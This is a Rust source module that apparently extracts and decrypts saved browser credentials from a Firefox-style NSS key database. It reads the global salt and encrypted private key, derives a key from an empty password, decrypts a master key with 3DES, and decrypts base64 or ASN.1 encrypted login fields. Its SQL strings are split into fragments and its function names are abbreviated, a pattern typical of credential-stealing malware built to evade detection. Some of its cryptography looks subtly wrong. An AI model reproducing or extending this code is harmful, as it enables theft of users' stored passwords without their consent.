use rusqlite::Connection;
use std::error::Error;

pub fn e_master_key(conn: &Connection) -> Result<Vec<u8>, Box<dyn Error>> {
    let mut stmt = conn.prepare(
        &["SEL","ECT item1, item2 FR","OM metadata WHERE id = 'pass","word'"].concat()
    )?;

    let result: Result<(Vec<u8>, Vec<u8>), _> = stmt.query_row([], |row| {
        Ok((row.get(0)?, row.get(1)?))
    });

    let (global_salt, _item2) = result?;

    let mut stmt = conn.prepare(
        &["SEL","ECT a11, a102 FR","OM nssPrivate"].concat()
    )?;

    let encrypted_key: Vec<u8> = stmt.query_row([], |row| row.get(0))?;

    let key = d_key_from_password("", &global_salt)?;

    let master_key = d_3des(&encrypted_key, &key)?;

    Ok(master_key)
}

pub fn d_field(master_key: &[u8], encrypted_data: &str) -> Result<String, Box<dyn Error>> {
    use base64::Engine;
    let decoded = base64::engine::general_purpose::STANDARD.decode(encrypted_data)?;

    if decoded.len() < 3 {
        return Err("Invalid encrypted data format".into());
    }

    let decrypted = if decoded[0] == 0x30 {
        d_asn1_data(&decoded, master_key)?
    } else {
        return Err("Unsupported encryption format".into());
    };

    let result = String::from_utf8(decrypted)?;
    Ok(result)
}

pub fn d_blob(master_key: &[u8], encrypted_blob: &[u8]) -> Result<String, Box<dyn Error>> {
    if encrypted_blob.len() < 3 {
        return Err("Invalid encrypted blob format".into());
    }

    let decrypted = if encrypted_blob[0] == 0x30 {
        d_asn1_data(encrypted_blob, master_key)?
    } else {
        return Err("Unsupported encryption format".into());
    };

    let result = String::from_utf8(decrypted)?;
    Ok(result)
}

fn d_key_from_password(password: &str, salt: &[u8]) -> Result<Vec<u8>, Box<dyn Error>> {
    use pbkdf2::pbkdf2_hmac;
    use sha2::Sha256;

    let mut key = vec![0u8; 32];
    pbkdf2_hmac::<Sha256>(password.as_bytes(), salt, 1, &mut key);
    Ok(key)
}

fn d_3des(encrypted: &[u8], key: &[u8]) -> Result<Vec<u8>, Box<dyn Error>> {
    use des::cipher::{BlockDecrypt, KeyInit};
    use des::TdesEde3;

    if encrypted.len() < 16 {
        return Err("Encrypted data too short".into());
    }

    let iv = &encrypted[0..8];
    let ciphertext = &encrypted[8..];

    let cipher = TdesEde3::new_from_slice(&key[0..24])
        .map_err(|e| format!("Failed to create cipher: {}", e))?;

    let mut result = Vec::new();
    let mut prev_block = iv.to_vec();

    for chunk in ciphertext.chunks(8) {
        if chunk.len() != 8 {
            break;
        }

        let mut block = [0u8; 8];
        block.copy_from_slice(chunk);

        let mut decrypted_block = block.into();
        cipher.decrypt_block(&mut decrypted_block);

        for (i, byte) in decrypted_block.iter_mut().enumerate() {
            *byte ^= prev_block[i];
        }

        result.extend_from_slice(&decrypted_block);
        prev_block = block.to_vec();
    }

    if let Some(&padding_len) = result.last() {
        if padding_len as usize <= result.len() && padding_len > 0 {
            let new_len = result.len() - padding_len as usize;
            result.truncate(new_len);
        }
    }

    Ok(result)
}

fn d_asn1_data(data: &[u8], master_key: &[u8]) -> Result<Vec<u8>, Box<dyn Error>> {

    let mut offset = 0;

    if data[offset] != 0x30 {
        return Err("Expected SEQUENCE tag".into());
    }
    offset += 1;
    let (_, new_offset) = p_length(&data[offset..])?;
    offset += new_offset;

    if data[offset] != 0x30 {
        return Err("Expected algorithm SEQUENCE".into());
    }
    offset += 1;
    let (seq_len, len_bytes) = p_length(&data[offset..])?;
    offset += len_bytes + seq_len;

    if data[offset] != 0x04 {
        return Err("Expected OCTETSTRING tag".into());
    }
    offset += 1;
    let (data_len, len_bytes) = p_length(&data[offset..])?;
    offset += len_bytes;

    let encrypted_data = &data[offset..offset + data_len];

    d_3des(encrypted_data, master_key)
}

fn p_length(data: &[u8]) -> Result<(usize, usize), Box<dyn Error>> {
    if data.is_empty() {
        return Err("Empty data".into());
    }

    let first_byte = data[0];

    if first_byte & 0x80 == 0 {
        Ok((first_byte as usize, 1))
    } else {
        let num_bytes = (first_byte & 0x7F) as usize;
        if data.len() < num_bytes + 1 {
            return Err("Invalid length encoding".into());
        }

        let mut length = 0usize;
        for i in 0..num_bytes {
            length = (length << 8) | data[1 + i] as usize;
        }

        Ok((length, 1 + num_bytes))
    }
}
